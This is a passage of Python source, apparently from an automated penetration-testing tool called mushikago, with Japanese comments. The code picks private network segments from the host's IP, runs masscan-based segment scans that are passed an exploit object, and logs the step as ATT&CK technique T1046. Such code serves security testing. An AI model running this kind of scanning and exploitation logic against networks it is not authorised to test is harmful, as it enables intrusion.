            node_id = self.segment_scan(exploit, nwscan, ipaddr, node_num, node_id, pre_node_id, 172)
            if node_id > pre_node_id:
              break
          elif (s2[0] == "192"):
            node_id = self.segment_scan(exploit, nwscan, ipaddr, node_num, node_id, pre_node_id, 192)
            if node_id > pre_node_id:
              break
      else: # session が存在しない場合、mushikago からスキャンを行う
        nwscan = masscan.MasScan()
        pre_node_id = node_id

        s2 = self.mushikago_ipaddr.split('.')

        if (s2[0] == "10"):
          node_id = self.segment_scan(exploit, nwscan, ipaddr, node_num, node_id, pre_node_id, 10)
        elif (s2[0] == "172"):
          node_id = self.segment_scan(exploit, nwscan, ipaddr, node_num, node_id, pre_node_id, 172)
        elif (s2[0] == "192"):
          node_id = self.segment_scan(exploit, nwscan, ipaddr, node_num, node_id, pre_node_id, 192)

    # nodes を json 形式にして書き込み
    self.wjson.write(self.node_json)

    # 検証内容を CSV 形式にして書き込み
    #self.wcsv.write(["T1046 (network scan) - " + src_ip, self.pre_exe, src_ip, "T1046"])
    #self.pre_exe = "T1046 (network scan) - " + src_ip
    self.wcsv.write(["T1046 (network scan)", self.pre_exe, self.mushikago_ipaddr, "T1046"])
    self.pre_exe = "T1046 (network scan)"


    return node_id

